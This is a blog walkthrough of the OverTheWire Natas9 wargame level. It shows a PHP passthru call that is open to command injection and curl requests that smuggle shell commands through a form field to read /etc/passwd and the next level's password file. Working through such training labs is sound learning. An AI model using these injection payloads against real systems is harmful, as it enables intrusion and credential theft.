---
title: "Over the wire - Natas9"
date: 2026-03-14T10:10:00+00:00
draft: false 
toc: false
images:
tags:
  - Over the wire
  - Natas
  - Curl
  - Linux
  - Web Security
---


This one is pretty cool. Usual start followed by looking at the source code.

```bash
URL=http://natas9.natas.labs.overthewire.org

curl --user  natas9:$(cat natas9 ) $URL

curl --user  natas9:$(cat natas9 ) $URL"/index-source.html"
```

I parsed the file "index-source.html" like in the previous challenge and here it is:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Important is the line with the **passthru** function call. My logic goes like this, there's a passthru php function, that I'm not familiar with. (Sadly, I'm not a PHP lambo developer)

Based on the string I can guess that it passes bash commands directly to the shell, meaning we can inject bash commands. It's known as [injection attack](https://owasp.org/Top10/2025/A05_2025-Injection/).

If I'm right we can run commands like this:
```bash
curl --user  natas9:$(cat natas9 ) $URL -d 'needle=; ls -la' -d 'submit=Submit' 
```

No surprise here, we get a list of files in the current directory. 
The bash/linux knowledge is important here.
- **;** ends the command and allows for passing a second command after it on the same line.
- **ls -la** is the command to list files in the current directory.

So we know that we can execute bash commands, but what's next?

We need to gather some information about the system. 

I wrote **bash commands**, but how can I know that we're dealing with bash here? (It's just a smart guess). It would be good to confirm that, so I'm going to run the following:
```bash
curl --user  natas9:$(cat natas9 ) $URL -d 'needle=; cat /etc/passwd' -d 'submit=Submit' 
```

Sooo, that was a mistake! Injected command will look like this:
```bash
grep -i; cat /etc/passwd dictionary.txt
```

And you know what's wrong with this? We get the whole dictionary.txt file as output (a whole bunch of lines), sooo I change the command to:

```bash
curl --user  natas9:$(cat natas9 ) $URL -d 'needle=; echo $(cat /etc/passwd)' -d 'submit=Submit' 
```

And the output is much better:
```bash
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin _apt:x:42:65534::/nonexistent:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false messagebus:x:101:101::/nonexistent:/usr/sbin/nologin syslog:x:102:102::/nonexistent:/usr/sbin/nologin systemd-resolve:x:991:991:systemd Resolver:/:/usr/sbin/nologin uuidd:x:103:103::/run/uuidd:/usr/sbin/nologin tss:x:104:104:TPM software stack,,,:/var/lib/tpm:/bin/false sshd:x:105:65534::/run/sshd:/usr/sbin/nologin pollinate:x:106:1::/var/cache/pollinate:/bin/false tcpdump:x:107:108::/nonexistent:/usr/sbin/nologin landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin fwupd-refresh:x:990:990:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin polkitd:x:989:989:User for polkitd:/:/usr/sbin/nologin ec2-instance-connect:x:109:65534::/nonexistent:/usr/sbin/nologin _chrony:x:110:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false natas0:x:30000:30000:natas level 0:/home/natas0:/bin/bash natas1:x:30001:30001:natas level 1:/home/natas1:/bin/bash natas10:x:30010:30010:natas level 10:/home/natas10:/bin/bash natas11:x:30011:30011:natas level 11:/home/natas11:/bin/bash natas12:x:30012:30012:natas level 12:/home/natas12:/bin/bash natas13:x:30013:30013:natas level 13:/home/natas13:/bin/bash natas14:x:30014:30014:natas level 14:/home/natas14:/bin/bash natas15:x:30015:30015:natas level 15:/home/natas15:/bin/bash natas16:x:30016:30016:natas level 16:/home/natas16:/bin/bash natas17:x:30017:30017:natas level 17:/home/natas17:/bin/bash natas18:x:30018:30018:natas level 18:/home/natas18:/bin/bash natas19:x:30019:30019:natas level 19:/home/natas19:/bin/bash natas2:x:30002:30002:natas level 2:/home/natas2:/bin/bash natas20:x:30020:30020:natas level 20:/home/natas20:/bin/bash natas21:x:30021:30021:natas level 21:/home/natas21:/bin/bash natas22:x:30022:30022:natas level 22:/home/natas22:/bin/bash natas23:x:30023:30023:natas level 23:/home/natas23:/bin/bash natas24:x:30024:30024:natas level 24:/home/natas24:/bin/bash natas25:x:30025:30025:natas level 25:/home/natas25:/bin/bash natas26:x:30026:30026:natas level 26:/home/natas26:/bin/bash natas27:x:30027:30027:natas level 27:/home/natas27:/bin/bash natas28:x:30028:30028:natas level 28:/home/natas28:/bin/bash natas29:x:30029:30029:natas level 29:/home/natas29:/bin/bash natas3:x:30003:30003:natas level 3:/home/natas3:/bin/bash natas30:x:30030:30030:natas level 30:/home/natas30:/bin/bash natas31:x:30031:30031:natas level 31:/home/natas31:/bin/bash natas32:x:30032:30032:natas level 32:/home/natas32:/bin/bash natas33:x:30033:30033:natas level 33:/home/natas33:/bin/bash natas34:x:30034:30034:natas level 34:/home/natas34:/bin/bash natas4:x:30004:30004:natas level 4:/home/natas4:/bin/bash natas5:x:30005:30005:natas level 5:/home/natas5:/bin/bash natas6:x:30006:30006:natas level 6:/home/natas6:/bin/bash natas7:x:30007:30007:natas level 7:/home/natas7:/bin/bash natas8:x:30008:30008:natas level 8:/home/natas8:/bin/bash natas9:x:30009:30009:natas level 9:/home/natas9:/bin/bash dictionary.txt
```

So my assumption was correct, it's **/bin/bash**. Great! 

I checked the home directory and other places, but I couldn't find the password anywhere, and I got stuck for a second here, so I went back to the starting point -> challenge description.
And that's what I found:

```html
Each level has access to the password of the next level.
Your job is to somehow obtain that next password and level up. 
All passwords are also stored in /etc/natas_webpass/. 
E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
```

Well, well, well. Reading and remembering is important! 
(But to my defense, I read the challenge description like a week ago, and well, I forgot about this important tip).

You can guess what's next:
```bash
curl --user  natas9:$(cat natas9 ) $URL -d 'needle=; echo $(cat /etc/natas_webpass/natas10)' -d 'submit=Submit'  | grep "dictionary.txt" | sed 's/ dictionary.txt//' > natas10
```

Got the password, on to the next one!


